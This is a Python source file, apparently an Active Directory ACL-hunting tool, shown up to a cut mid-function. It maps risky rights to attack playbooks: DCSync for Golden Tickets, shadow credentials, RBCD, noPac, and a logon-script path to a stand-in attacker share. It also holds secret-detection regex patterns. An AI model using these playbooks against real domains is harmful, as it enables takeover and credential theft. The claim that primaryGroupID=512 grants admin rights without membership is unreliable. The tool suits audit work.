import argparse
import sys
import struct
import json
import re
from collections import deque, defaultdict
from dataclasses import dataclass, field
from datetime import datetime, timezone, timedelta
from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, BASE
from ldap3.protocol.microsoft import security_descriptor_control
from colorama import Fore, Style, init

init(autoreset=True)

                                                                                
                                                                     
                                                                                
_PWD_RE = [
    re.compile(r'(?i)\b(?:password|passwd|pwd|secret|token|credential|client\s*secret|api[-_ ]?key)\b\s*[:=]\s*\S{6,}'),
    re.compile(r'(?i)\b(?:password|passwd|pwd|secret|token|credential|client\s*secret|api[-_ ]?key)\b\s+\S{8,}'),
    re.compile(r'(?i)\b(?:basic\s+[A-Za-z0-9._~+/=-]{20,}|bearer\s+[A-Za-z0-9._~+/=-]{20,})\b'),
    re.compile(r'(?i)\b(?:connection\s*string|connstring)\b\s*[:=]\s*\S{10,}'),
    re.compile(r'(?i)\b(?:api[-_ ]?token|auth[-_ ]?token|refresh[-_ ]?token)\b\s*[:=]\s*\S{16,}'),
    re.compile(r'(?i)\b(?:change\s*me|initial\s*password|default\s*password|temporary\s*password)\b'),
]
_SENSITIVE_LDAP_FIELDS = [
    "info", "description", "adminDescription", "comment",
    "adminDisplayName",
    "extensionAttribute1",  "extensionAttribute2",  "extensionAttribute3",
    "extensionAttribute4",  "extensionAttribute5",  "extensionAttribute6",
    "extensionAttribute7",  "extensionAttribute8",  "extensionAttribute9",
    "extensionAttribute10", "extensionAttribute11", "extensionAttribute12",
    "extensionAttribute13", "extensionAttribute14", "extensionAttribute15",
]

                                                                                
         
                                                                                
BANNER = ""

W = 80


                                                                                
              
                                                                                
EXTENDED_RIGHT_GUIDS = {
    "00299570-246d-11d0-a768-00aa006e0529": "ForceChangePassword",
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes",
    "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Synchronize",
    "1131f6ac-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Manage-Topology",
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes-All",
    "89e95b76-444d-4c62-991a-0facbeda640c": "DS-Replication-Get-Changes-In-Filtered-Set",
    "ba33815a-4f93-4c76-87f3-57574bff8109": "MigrateSIDHistory",
    "ab721a53-1e2f-11d0-9819-00aa0040529b": "UserChangePassword",
    "68b1d179-0d15-4d4f-ab71-46152e79a7bc": "AllowedToAuthenticate",
    "9923a32a-3607-11d2-b9be-0000f87a36b2": "DS-Install-Replica",
    "cc17b1fb-33d9-11d2-97d4-00c04fd8d5cd": "User-Account-Restrictions",
                                                                                
                                                                               
                                                                          
                                                                              
                                                                                
}

                                                                                
                                                                       
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
WLAPS_PASSWORD_GUID           = "a6b34bd9-9e1c-4a43-9a6c-2d9a7f9e6a19"            
WLAPS_ENCRYPTEDPASSWORD_GUID  = "60f5b8f8-aa0c-43ef-b3c4-16e0d9a39c28"             

                                                                                
                                                                          
                                                                                
LAPS_SECRET_LDAP_NAMES = [
    "ms-Mcs-AdmPwd",                  
    "msLAPS-Password",                
    "msLAPS-EncryptedPassword",       
]

                                                                          
                                                                          
PROPERTY_WRITE_GUIDS = {
                      
    "bf9679c0-0de6-11d0-a285-00aa003049e2": "AddMember",                   
                        
    "5b47d60f-6090-40b2-9f37-2a4de88f3063": "ShadowCredentials",                           
          
    "e48d0154-bcf8-11d1-8702-00c04fb96050": "SetRBCD",                                                       
         
    "f3a64788-5306-11d1-a9c5-0000f80367c1": "WriteSPN",                                  
                                      
    "bf967a00-0de6-11d0-a285-00aa003049e2": "SetPrimaryGroup",                     
                                            
    "bf9679a8-0de6-11d0-a285-00aa003049e2": "WriteScriptPath",                 
                           
    "9b026da6-0d3c-465c-8bee-5199d7165cba": "WriteGPLink",                 
                                                     
    "bf96791d-0de6-11d0-a285-00aa003049e2": "WriteUserParams",                     
                                                                                  
    "4c164200-20c0-11d0-a768-00aa006e0529": "WriteUserAccountControl",
                                                                                          
    "3e0abfd0-126a-11d0-a060-00aa006c33ed": "WriteSAMAccountName",
                          
    "ea1b7b93-5e48-46d5-bc6c-4df4fda78a35": "WriteLoginScript",
                 
    "0296c120-40da-11d1-a9c0-0000f80367c1": "WriteDisplayName",
                                                                            
    "00fbf30c-91fe-11d1-aebc-0000f80367c1": "WriteAltSecurityIdentities",
                                               
    "bf967a0a-0de6-11d0-a285-00aa003049e2": "WritePwdLastSet",
                 
    "bf967a05-0de6-11d0-a285-00aa003049e2": "WriteProfilePath",
                                                               
    "800d94d7-b7a1-42a1-b14d-7cae1423d07f": "WriteAllowedToDelegateTo",
                                   
    "20119867-1d04-4ab7-9371-cfc3d5df0afd": "WriteSupportedEncTypes",
                                                                                 
    "b7c69e6d-2cc7-11d2-854e-00a0c983f608": "WriteTokenGroups",
}

                                                                
PROPERTY_WRITE_SEVERITY = {
    "AddMember":                   "HIGH",
    "ShadowCredentials":           "HIGH",
    "SetRBCD":                     "HIGH",
    "WriteSPN":                    "HIGH",
    "SetPrimaryGroup":             "HIGH",                                                    
    "WriteScriptPath":             "HIGH",
    "WriteGPLink":                 "HIGH",
    "WriteUserParams":             "HIGH",
    "WriteUserAccountControl":     "HIGH",
    "WriteSAMAccountName":         "HIGH",
    "WriteLoginScript":            "HIGH",
    "WriteAltSecurityIdentities":  "HIGH",
    "WriteAllowedToDelegateTo":    "HIGH",
    "WriteDisplayName":            "LOW",
    "WritePwdLastSet":             "MEDIUM",
    "WriteProfilePath":            "LOW",
    "WriteSupportedEncTypes":      "MEDIUM",
    "WriteTokenGroups":            "LOW",
}

DANGEROUS_GUIDS = {**EXTENDED_RIGHT_GUIDS, **PROPERTY_WRITE_GUIDS}


                                                                                
                           
                                                                                
ATTACK_TECHNIQUES = {
    "GenericAll": {
        "technique": "Full Object Control — read, write, delete, change owner, modify DACL",
        "severity":  "CRITICAL",
        "methods":   ["force-change-password", "add-member", "write-dacl",
                      "take-ownership", "shadow-credentials", "set-spn", "set-rbcd",
                      "set-primary-group", "set-scriptpath", "write-property"],
        "attack_vector": "Exploit any of the listed methods. GenericAll = complete account takeover.",
    },
    "WriteDacl": {
        "technique": "DACL Write — grant arbitrary rights to yourself on the target",
        "severity":  "HIGH",
        "methods":   ["write-dacl → add GenericAll → full control"],
        "attack_vector": "Grant yourself GenericAll, then proceed with any attack.",
    },
    "WriteOwner": {
        "technique": "Take Ownership — become object owner, then modify DACL freely",
        "severity":  "HIGH",
        "methods":   ["take-ownership → write-dacl → full-control"],
        "attack_vector": "Set yourself as owner, grant WriteDacl, grant GenericAll.",
    },
    "GenericWrite": {
        "technique": "Write any writable attribute (non-protected) on the target",
        "severity":  "HIGH",
        "methods":   ["shadow-credentials", "set-spn", "set-rbcd",
                      "set-scriptpath", "set-primary-group", "write-alt-sec-ids"],
        "attack_vector": "Write msDS-KeyCredentialLink for shadow creds, or write SPN for Kerberoasting.",
    },
    "WriteAllProperties": {
        "technique": "Write any attribute (WriteProperty with no GUID restriction)",
        "severity":  "HIGH",
        "methods":   ["shadow-credentials", "set-spn", "set-rbcd",
                      "set-scriptpath", "set-primary-group", "write-alt-sec-ids"],
        "attack_vector": "Same as GenericWrite — write any attribute without restriction.",
    },
    "ForceChangePassword": {
        "technique": "Password Reset (no current password required)",
        "severity":  "HIGH",
        "methods":   ["force-change-password"],
        "attack_vector": "Reset the target's password to anything — immediate account takeover.",
    },
    "DS-Replication-Get-Changes-All": {
        "technique": "Full DCSync — extract any account hash including krbtgt",
        "severity":  "CRITICAL",
        "methods":   ["dcsync"],
        "attack_vector": "DCSync to extract krbtgt hash → Golden Ticket for persistent domain access.",
    },
    "DS-Replication-Get-Changes": {
        "technique": "Partial DCSync — non-secret attributes; combine with Get-Changes-All for full sync",
        "severity":  "HIGH",
        "methods":   ["dcsync-partial"],
        "attack_vector": "Combine with DS-Replication-Get-Changes-All for full DCSync.",
    },
    "DS-Replication-Get-Changes-In-Filtered-Set": {
        "technique": "DCSync filtered-set — used in RODC replication scope",
        "severity":  "HIGH",
        "methods":   ["dcsync-rodc"],
        "attack_vector": "Used in certain RODC configurations; may expose passwords in filtered scope.",
    },
    "AddMember": {
        "technique": "Add any principal to the target group",
        "severity":  "HIGH",
        "methods":   ["add-member"],
        "attack_vector": "Add yourself to Domain Admins or any privileged group.",
    },
    "ShadowCredentials": {
        "technique": "Write msDS-KeyCredentialLink — PKINIT certificate-based takeover",
        "severity":  "HIGH",
        "methods":   ["shadow-credentials → PKINIT → extract NT hash"],
        "attack_vector": "Pywhisker/Certipy to inject key credential, then PKINIT to get TGT and NT hash.",
    },
    "SetRBCD": {
        "technique": "Write msDS-AllowedToActOnBehalfOfOtherIdentity — RBCD on target computer",
        "severity":  "HIGH",
        "methods":   ["set-rbcd → S4U2Self → S4U2Proxy → impersonate any user"],
        "attack_vector": "Configure RBCD to allow a controlled machine account to impersonate admins.",
    },
    "WriteSPN": {
        "technique": "Set arbitrary SPN on target account — enables targeted Kerberoasting",
        "severity":  "HIGH",
        "methods":   ["set-spn → targeted-kerberoast → offline-crack"],
        "attack_vector": "Set fake SPN, request TGS, crack offline. Effective against high-value accounts.",
    },
    "MigrateSIDHistory": {
        "technique": "Inject arbitrary SID into sIDHistory — Kerberos PAC privilege escalation",
        "severity":  "CRITICAL",
        "methods":   ["add-sid-history → inject-DA-SID → Kerberos-PAC-privilege"],
        "attack_vector": "Inject Domain Admin SID into sIDHistory — account gains DA privileges silently.",
    },
    "SetPrimaryGroup": {
        "technique": "Modify primaryGroupID — embedded in Kerberos PAC, controls primary group membership",
        "severity":  "HIGH",                         
        "methods":   ["set-primary-group → manipulate-PAC-primary-group"],
        "attack_vector": (
            "Set primaryGroupID to 512 (Domain Admins RID). The primary group is embedded in "
            "the Kerberos PAC and does NOT require physical group membership — the DC includes "
            "it automatically. Effective when account is also in Domain Users (513). "
            "Use ldap_modify to set primaryGroupID=512, then authenticate for DA-level PAC."
        ),
    },
    "WriteScriptPath": {
        "technique": "Write scriptPath (logon script path) — code execution on next user logon",
        "severity":  "HIGH",
        "methods":   ["set-scriptpath → UNC-path → code-exec-on-logon"],
        "attack_vector": (
            "Set scriptPath to a UNC path you control (e.g. \\\\attacker\\share\\evil.bat). "
            "The next time the target user logs on interactively, Windows executes the script "
            "in their security context. For admin accounts this is a reliable lateral movement "
            "or privilege persistence mechanism."
        ),
    },
    "WriteLoginScript": {
        "technique": "Write loginScript (legacy logon script) — code execution on logon",
        "severity":  "HIGH",
        "methods":   ["set-loginscript → filename-in-SYSVOL → code-exec-on-logon"],
        "attack_vector": "Same as WriteScriptPath but uses NETLOGON share path.",
    },
    "WriteAltSecurityIdentities": {
        "technique": "Write altSecurityIdentities — inject arbitrary Kerberos principal or certificate mapping",
        "severity":  "HIGH",
        "methods":   ["write-altsecids → certificate-mapping → auth-as-target"],
        "attack_vector": (
            "Map a certificate you own to the target account. Then authenticate as the target "
            "using that certificate via PKINIT without knowing their password."
        ),
    },
    "WriteUserAccountControl": {
        "technique": "Modify userAccountControl — enable delegation, disable pre-auth, unlock account",
        "severity":  "HIGH",
        "methods":   ["write-uac → enable-unconstrained-delegation",
                      "write-uac → set-DONT_REQUIRE_PREAUTH → ASREPRoast"],
        "attack_vector": (
            "Set DONT_REQUIRE_PREAUTH to enable ASREPRoasting. "
            "Or enable TRUSTED_FOR_DELEGATION to turn the account into an unconstrained delegation target."
        ),
    },
    "WriteSAMAccountName": {
        "technique": "Write sAMAccountName — noPac / sAMAccountName spoofing attack",
        "severity":  "HIGH",
        "methods":   ["write-samaccountname → noPac-CVE-2021-42278 → privilege-escalation"],
        "attack_vector": (
            "Rename computer account to strip trailing '$' to match a DC name, "
            "request TGT, rename back — DC issues ST with DC privileges (noPac)."
        ),
    },
    "WriteUserParams": {
        "technique": "Write userParameters — can set terminal service paths, logon scripts",
        "severity":  "HIGH",
        "methods":   ["write-userparams → embed-logon-script → code-exec"],
        "attack_vector": "Embed a logon script inside userParameters for Terminal Services clients.",
    },
    "WriteGPLink": {
        "technique": "Link GPO to OU/domain — policy applied to all objects in scope",
        "severity":  "HIGH",
        "methods":   ["gpo-link → attach-malicious-gpo → policy-exec-on-next-refresh"],
        "attack_vector": "Link a malicious GPO you control to this OU — executes on all machines/users in scope.",
    },
    "WriteAllowedToDelegateTo": {
        "technique": "Write msDS-AllowedToDelegateTo — constrained delegation target list",
        "severity":  "HIGH",
        "methods":   ["write-constrained-delegation → S4U2Proxy → impersonate-to-target-service"],
        "attack_vector": "Add a high-value SPN (e.g. cifs/DC01) to force constrained delegation privilege.",
    },
    "AllExtendedRights": {
        "technique": "All Extended Rights — ForceChangePassword + DCSync + ReadLAPS + more",
        "severity":  "HIGH",
        "methods":   ["force-change-password", "dcsync", "read-laps-password"],
        "attack_vector": "Includes ForceChangePassword and potentially DCSync and LAPS read rights.",
    },
    "AllowedToAuthenticate": {
        "technique": "Selective Authentication bypass on trust boundary",
        "severity":  "MEDIUM",
        "methods":   ["selective-auth-bypass"],
        "attack_vector": "Allows principals to authenticate across a selective authentication trust.",
    },
    "WriteProperty": {
        "technique": "Write a specific AD attribute (GUID identifies exact attribute)",
        "severity":  "MEDIUM",
        "methods":   ["write-property → depends on target attribute"],
        "attack_vector": "Determine the exact attribute from the GUID and exploit accordingly.",
    },
    "Self": {
        "technique": "Validated write — self-add to group member attribute",
        "severity":  "LOW",
        "methods":   ["self-add-member"],
        "attack_vector": "Add yourself to the group without needing AddMember — subtle privilege escalation.",
    },
    "UserChangePassword": {
        "technique": "Change password (current password required)",
        "severity":  "LOW",
        "methods":   ["change-password"],
        "attack_vector": "Requires knowing the current password; limited to credential-in-hand scenarios.",
    },
    "ReadLAPSPassword": {
        "technique": "Read LAPS managed password (legacy ms-Mcs-AdmPwd or Windows LAPS msLAPS-Password / msLAPS-EncryptedPassword) for a computer account",
        "severity":  "HIGH",
        "methods":   ["read-laps-password → local-admin-access"],
        "attack_vector": (
            "Read the LAPS-managed local admin password directly from the computer object "
            "(e.g. via Get-AdmPwdPassword, pyLAPS.py, bloodyAD, or a plain LDAP read of the "
            "relevant attribute) — grants immediate local Administrator access to that host."
        ),
    },
    "ReadGMSAPassword": {
        "technique": "Read GMSA managed password via PrincipalsAllowedToRetrieveManagedPassword (msDS-GroupMSAMembership)",
        "severity":  "HIGH",
        "methods":   ["read-gmsa-password → compute-NTLM-hash → authenticate-as-service-account"],
        "attack_vector": (
            "Principal is explicitly listed as allowed to retrieve the managed password for this "
            "gMSA (security descriptor stored inside msDS-GroupMSAMembership, exposed as "
            "PrincipalsAllowedToRetrieveManagedPassword). Query msDS-ManagedPassword directly "
            "(e.g. gMSADumper.py, NetExec, bloodyAD) to derive the current NTLM hash and "
            "authenticate as the service account."
        ),
    },
    "WriteSupportedEncTypes": {
        "technique": "Write msDS-SupportedEncryptionTypes — downgrade Kerberos encryption",
        "severity":  "MEDIUM",
        "methods":   ["downgrade-kerberos-enc → RC4 → targeted-kerberoast"],
        "attack_vector": "Remove AES support to force RC4 — makes Kerberoasting hashes easier to crack.",
    },
}


                                                                                
                  
                                                                                
SEVERITY = {
    "GenericAll":                                 "CRITICAL",
    "DS-Replication-Get-Changes-All":             "CRITICAL",
    "MigrateSIDHistory":                          "CRITICAL",
    "WriteDacl":                                  "HIGH",
    "WriteOwner":                                 "HIGH",
    "GenericWrite":                               "HIGH",
    "WriteAllProperties":                         "HIGH",                                   
    "AllExtendedRights":                          "HIGH",
    "DS-Replication-Get-Changes":                 "HIGH",
    "DS-Replication-Get-Changes-In-Filtered-Set": "HIGH",
    "DS-Replication-Synchronize":                 "HIGH",
    "ForceChangePassword":                        "HIGH",
    "AddMember":                                  "HIGH",
    "ShadowCredentials":                          "HIGH",
    "SetRBCD":                                    "HIGH",
    "WriteSPN":                                   "HIGH",
    "WriteScriptPath":                            "HIGH",
    "WriteLoginScript":                           "HIGH",
    "WriteGPLink":                                "HIGH",
    "WriteAltSecurityIdentities":                 "HIGH",
    "WriteUserAccountControl":                    "HIGH",
    "WriteSAMAccountName":                        "HIGH",
    "WriteUserParams":                            "HIGH",
    "WriteAllowedToDelegateTo":                   "HIGH",
    "ReadLAPSPassword":                           "HIGH",
    "ReadGMSAPassword":                           "HIGH",
    "SetPrimaryGroup":                            "HIGH",                                        
    "WriteSupportedEncTypes":                     "MEDIUM",
    "WriteProperty":                              "MEDIUM",
    "AllowedToAuthenticate":                      "MEDIUM",
    "WritePwdLastSet":                            "MEDIUM",
    "Self":                                       "LOW",
    "UserChangePassword":                         "LOW",
    "WriteDisplayName":                           "LOW",
    "WriteProfilePath":                           "LOW",
    "WriteTokenGroups":                           "LOW",
}

SEVERITY_COLOR = {
    "CRITICAL": Fore.RED,
    "HIGH":     Fore.LIGHTYELLOW_EX,
    "MEDIUM":   Fore.YELLOW,
    "LOW":      Fore.WHITE,
}

SEVERITY_ICON = {
    "CRITICAL": "🔴",
    "HIGH":     "🟠",
    "MEDIUM":   "🟡",
    "LOW":      "⚪",
}

                                                                                
                  
                                                                                
TRUST_ATTR_NON_TRANSITIVE     = 0x00000001
TRUST_ATTR_UPLEVEL_ONLY       = 0x00000002
TRUST_ATTR_QUARANTINED        = 0x00000004
TRUST_ATTR_FOREST_TRANSITIVE  = 0x00000008
TRUST_ATTR_CROSS_ORGANIZATION = 0x00000010
TRUST_ATTR_WITHIN_FOREST      = 0x00000020
TRUST_ATTR_TREAT_AS_EXTERNAL  = 0x00000040
TRUST_ATTR_USES_RC4           = 0x00000080

TRUST_TYPE_MAP = {
    1: "DOWNLEVEL (NT4/NetBIOS)",
    2: "UPLEVEL   (Active Directory)",
    3: "MIT       (Kerberos Realm)",
    4: "DCE       (Obsolete)",
}
TRUST_DIR_MAP = {
    1: ("Inbound",       "→  They trust us   [their users auth to OUR resources]"),
    2: ("Outbound",      "←  We trust them   [our users auth to THEIR resources]"),
    3: ("Bidirectional", "↔  Mutual trust    [full auth in both directions]"),
}

ACE_TYPE_NAMES = {
    0x00: "ACCESS_ALLOWED_ACE",
    0x01: "ACCESS_DENIED_ACE",
    0x02: "SYSTEM_AUDIT_ACE",
    0x05: "ACCESS_ALLOWED_OBJECT_ACE",
    0x06: "ACCESS_DENIED_OBJECT_ACE",
}

                              
UAC_DISABLED                    = 0x00000002
UAC_HOMEDIR_REQUIRED            = 0x00000008
UAC_LOCKOUT                     = 0x00000010
UAC_PASSWD_NOTREQD              = 0x00000020
UAC_PASSWD_CANT_CHANGE          = 0x00000040
UAC_ENCRYPTED_TEXT_PWD_ALLOWED  = 0x00000080
UAC_NORMAL_ACCOUNT              = 0x00000200
UAC_INTERDOMAIN_TRUST           = 0x00000800
UAC_WORKSTATION_TRUST           = 0x00001000
UAC_SERVER_TRUST                = 0x00002000
UAC_DONT_EXPIRE_PASSWORD        = 0x00010000
UAC_TRUSTED_FOR_DELEGATION      = 0x00080000
UAC_NOT_DELEGATED               = 0x00100000
UAC_USE_DES_KEY_ONLY            = 0x00200000
UAC_DONT_REQ_PREAUTH            = 0x00400000
UAC_PASSWORD_EXPIRED            = 0x00800000
UAC_TRUSTED_TO_AUTH_FOR_DELEGATION = 0x01000000                        
UAC_PARTIAL_SECRETS_ACCOUNT     = 0x04000000             

                          
PRIMARY_GROUP_DOMAIN_USERS    = 513
PRIMARY_GROUP_COMPUTERS       = 515
PRIMARY_GROUP_DCS             = 516
PRIMARY_GROUP_READONLY_DCS    = 521
PRIMARY_GROUP_DOMAIN_ADMINS   = 512
PRIMARY_GROUP_ENTERPRISE_ADMINS = 519
PRIMARY_GROUP_SCHEMA_ADMINS   = 518

                                                                                
                  
                                                                                
def get_args():
    parser = argparse.ArgumentParser(
        description="AD ACL Hunter — Active Directory ACL analysis",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    auth = parser.add_argument_group("Authentication")
    auth.add_argument("-u", "--username", required=True, help="Username")
    auth.add_argument("-p", "--password", required=True, help="Password")
    auth.add_argument("-d", "--domain",   required=True, help="Domain name")
    auth.add_argument("--dc-ip",          required=True, help="DC IP address")

    mode = parser.add_argument_group("Modes  [combinable]")
    mode.add_argument("-t", "--target", metavar="NAME",
                      help="Inspect ACLs for a target")
    mode.add_argument("--with-members", action="store_true",
                      help="Include group members")
    mode.add_argument("--list-members", metavar="GROUP",
                      help="List group members")
    mode.add_argument("--member-of", metavar="USERNAME",
                      help="List user groups")
    mode.add_argument("--is-nested", metavar="GROUP",
                      help="Show parent groups")
    mode.add_argument("--priv-access", action="store_true",
                      help="Enumerate privileged access")
    mode.add_argument("--admin-sdholder", action="store_true",
                      help="Inspect AdminSDHolder ACLs")
    mode.add_argument("--domain-recon", action="store_true",
                      help="Run domain reconnaissance")
    mode.add_argument("--trust-enum", action="store_true",
                      help="Enumerate trusts")
    mode.add_argument("--trust-deep", action="store_true",
                      help="Deep trust analysis")
    mode.add_argument("--needle", action="store_true", help="Run the deep hidden-privilege scan")

    parser.add_argument("-o", "--output",     help="Write results to JSON", default=None)
    parser.add_argument("--all-rights",       action="store_true",
                        help="Include all ACEs")
    parser.add_argument("--no-inherited",     action="store_true",
                        help="Skip inherited ACEs")
    parser.add_argument("--page-size", type=int, default=500,
                        help="LDAP page size")
    return parser.parse_args()


                                                                                
                          
                                                                                
def sid_to_str(sid_bytes: bytes) -> str:
    if not sid_bytes or len(sid_bytes) < 8:
        return ""
    try:
        revision  = sid_bytes[0]
        sub_count = sid_bytes[1]
        authority = int.from_bytes(sid_bytes[2:8], byteorder="big")
        subs = [
            str(struct.unpack_from("<I", sid_bytes, 8 + 4 * i)[0])
            for i in range(sub_count)
        ]
        return f"S-{revision}-{authority}-" + "-".join(subs)
    except Exception:
        return ""


def format_guid(raw: bytes) -> str | None:
    if not raw or len(raw) < 16:
        return None
    try:
        p1 = struct.unpack_from("<I",  raw, 0)[0]
        p2 = struct.unpack_from("<H",  raw, 4)[0]
        p3 = struct.unpack_from("<H",  raw, 6)[0]
        p4 = raw[8:10].hex()
        p5 = raw[10:16].hex()
        return f"{p1:08x}-{p2:04x}-{p3:04x}-{p4}-{p5}"
    except Exception:
        return None


def parse_sd_owner(sd_bytes: bytes) -> str:
    try:
        if len(sd_bytes) < 20:
            return ""
        owner_offset = struct.unpack_from("<I", sd_bytes, 4)[0]
        if not owner_offset or owner_offset >= len(sd_bytes):
            return ""
        return sid_to_str(sd_bytes[owner_offset:])
    except Exception:
        return ""


def sid_bytes_escape(sid_str: str) -> str:
    
    parts     = sid_str.split("-")
    revision  = int(parts[1])
    authority = int(parts[2])
    sub_count = len(parts) - 3
    subs      = [int(p) for p in parts[3:]]
    raw  = bytes([revision, sub_count])
    raw += authority.to_bytes(6, "big")
    for s in subs:
        raw += s.to_bytes(4, "little")
    return "".join(f"\\{b:02x}" for b in raw)


def first_value(value):
    if value is None:
        return None
    if isinstance(value, (list, tuple)):
        return value[0] if value else None
    return value


def listify(value) -> list:
    if value is None:
        return []
    if isinstance(value, (list, tuple)):
        return list(value)
    return [value]


def filetime_to_dt(filetime_int: int) -> datetime | None:
    
    if not filetime_int or filetime_int == 0:
        return None
    try:
        epoch_diff = 116444736000000000
        ts = (filetime_int - epoch_diff) / 10_000_000
        return datetime.fromtimestamp(ts, tz=timezone.utc)
    except Exception:
        return None


def days_since(dt: datetime | None) -> int | None:
    if dt is None:
        return None
    try:
        return (datetime.now(tz=timezone.utc) - dt).days
    except Exception:
        return None


                                                                                
                                 
                                                                                
def ldap_connect(dc_ip: str, domain: str, username: str, password: str) -> Connection:
    server = Server(dc_ip, get_info=ALL)
    return Connection(
        server,
        user=f"{domain}\\{username}",
        password=password,
        authentication=NTLM,
        auto_bind=True,
    )


                                                                                
                                                            
                                                                                
def resolve_schema_guids(conn, ldap_names: list) -> dict:
    
    result = {}
    try:
        schema_dn = None
        try:
            other = conn.server.info.other or {}
            vals  = other.get("schemaNamingContext") or []
            schema_dn = vals[0] if vals else None
        except Exception:
            schema_dn = None
        if not schema_dn:
            return result
        name_clauses = "".join(f"(lDAPDisplayName={n})" for n in ldap_names)
        conn.search(
            search_base=schema_dn,
            search_filter=f"(|{name_clauses})",
            search_scope=SUBTREE,
            attributes=["lDAPDisplayName", "schemaIDGUID"],
        )
        for e in conn.entries:
            try:
                nm      = str(e["lDAPDisplayName"].value).lower()
                raw_val = e["schemaIDGUID"].raw_values[0]
                guid    = format_guid(raw_val)
                if guid:
                    result[nm] = guid.lower()
            except Exception:
                continue
    except Exception:
        pass
    return result


def build_laps_read_guids(conn) -> dict:
    
    guid_map = {}
                                                                             
                                                                           
                                                                              
    guid_map[WLAPS_PASSWORD_GUID.lower()]          = "ReadLAPSPassword"
    guid_map[WLAPS_ENCRYPTEDPASSWORD_GUID.lower()] = "ReadLAPSPassword"
    try:
        dynamic = resolve_schema_guids(conn, LAPS_SECRET_LDAP_NAMES)
        for guid in dynamic.values():
            guid_map[guid] = "ReadLAPSPassword"
    except Exception:
        pass
    return guid_map


def paged_search_all(conn, base_dn: str, search_filter: str,
                     attributes: list, page_size: int = 500,
                     extra_controls=None) -> list:
    
    entries  = []
    controls = extra_controls or []
    pg_size  = max(int(page_size or 500), 1)
    try:
        for entry in conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter=search_filter,
            search_scope=SUBTREE,
            attributes=attributes,
            controls=controls,
            paged_size=pg_size,
            generator=True,
        ):
            if entry.get("type") != "searchResEntry":
                continue
            entries.append({
                "dn":             entry.get("dn", ""),
                "raw_attributes": entry.get("raw_attributes", {}),
                "attributes":     entry.get("attributes", {}),
            })
    except Exception as e:
        print(f"{Fore.RED}[-] paged_search error: {e}{Style.RESET_ALL}")
    return entries


def get_object_info(conn, domain_dn: str, sam: str) -> dict:
    conn.search(
        search_base=domain_dn,
        search_filter=f"(sAMAccountName={sam})",
        search_scope=SUBTREE,
        attributes=["objectSid", "distinguishedName", "name",
                    "objectClass", "memberOf", "member"],
    )
    if not conn.entries:
        print(f"{Fore.RED}[-] Object '{sam}' not found!{Style.RESET_ALL}")
        sys.exit(1)
    e       = conn.entries[0]
    raw_sid = e["objectSid"].raw_values[0]
    classes = [c.lower() for c in e["objectClass"].values]
    return {
        "sid":      sid_to_str(raw_sid),
        "dn":       str(e["distinguishedName"]),
        "name":     str(e["name"]),
        "classes":  classes,
        "is_group": "group" in classes,
        "is_user":  "user"  in classes,
    }


def resolve_sid_to_name(conn, domain_dn: str, sid: str) -> str:
    cache = resolve_sid_to_name._cache
    if sid in cache:
        return cache[sid]
    WELL_KNOWN = {
        "S-1-1-0":      "Everyone",
        "S-1-5-7":      "Anonymous Logon",
        "S-1-5-9":      "Enterprise Domain Controllers",
        "S-1-5-10":     "Self",
        "S-1-5-11":     "Authenticated Users",
        "S-1-5-18":     "SYSTEM",
        "S-1-5-32-544": "Builtin Administrators",
        "S-1-5-32-545": "Builtin Users",
        "S-1-5-32-548": "Account Operators",
        "S-1-5-32-549": "Server Operators",
        "S-1-5-32-550": "Print Operators",
        "S-1-5-32-551": "Backup Operators",
        "S-1-5-32-552": "Replicators",
        "S-1-5-32-554": "Pre-Windows 2000 Compatible Access",
        "S-1-5-32-555": "Remote Desktop Users",
        "S-1-5-32-556": "Network Configuration Operators",
        "S-1-5-32-579": "Access Control Assistance Operators",
        "S-1-5-32-580": "Remote Management Users",
    }
    if sid in WELL_KNOWN:
        cache[sid] = WELL_KNOWN[sid]
        return WELL_KNOWN[sid]
    try:
        sid_hex = sid_bytes_escape(sid)
        conn.search(
            search_base=domain_dn,
            search_filter=f"(objectSid={sid_hex})",
            search_scope=SUBTREE,
            attributes=["sAMAccountName", "name"],
        )
        if conn.entries:
            e   = conn.entries[0]
            sam = (str(e["sAMAccountName"].value)
                   if e["sAMAccountName"].value else str(e["name"].value))
            cache[sid] = sam
            return sam
    except Exception:
        pass
    cache[sid] = sid
    return sid

resolve_sid_to_name._cache = {}


def entry_summary(entry: dict) -> tuple[str, str]:
    attrs = entry.get("attributes", {}) or {}
    dn    = entry.get("dn", "") or ""
    sam   = first_value(attrs.get("sAMAccountName"))
    if not sam:
        sam = first_value(attrs.get("name"))
    if not sam and dn:
        sam = dn.split(",", 1)[0].replace("CN=", "").replace("OU=", "")
    if not sam:
        sam = dn or "unknown"
    classes   = listify(attrs.get("objectClass"))
    obj_class = " | ".join(str(c).lower() for c in classes) if classes else "unknown"
    return str(sam), str(obj_class)


def _get_domain_sid_prefix(conn, domain_dn: str) -> str:
    try:
        conn.search(
            search_base=domain_dn,
            search_filter="(objectClass=domain)",
            search_scope=BASE,
            attributes=["objectSid"],
        )
        if conn.entries:
            raw = conn.entries[0]["objectSid"].raw_values[0]
            return sid_to_str(raw)
    except Exception:
        pass
    return ""


def _is_legit_netlogon_script(script: str, domain_dn: str) -> bool:
    
    if not script:
        return True
    s = script.strip().lower()
    if not s:
        return True
                                                                             
    if not s.startswith("\\\\"):
        return True
                                          
    parts = [p.replace("dc=","").replace("DC=","") for p in domain_dn.split(",")
             if p.lower().startswith("dc=")]
    fqdn  = ".".join(parts).lower()
    short = parts[0].lower() if parts else ""
    legit_hosts = {fqdn, short}
                                                                           
    for host in legit_hosts:
        for share in ("netlogon", "sysvol"):
            if s.startswith(f"\\\\{host}\\{share}\\") or s.startswith(f"\\\\{host}\\{share}"):
                return True
    return False


def _is_whfb_shadow_cred(cred_val: list) -> bool:
    
    if not cred_val or len(cred_val) != 1:
        return False
    blob = cred_val[0]
    if isinstance(blob, (bytes, bytearray)):
                                                                        
        return len(blob) >= 160
    s = str(blob).strip()
    if not s:
        return False
    s_low = s.lower()
    return any(tag in s_low for tag in ("whfb", "windows hello", "azuread", "azure ad", "deviceid", "keycredential")) and len(s) >= 80


def _is_fp_info_field(val: str, matched: str) -> bool:
    
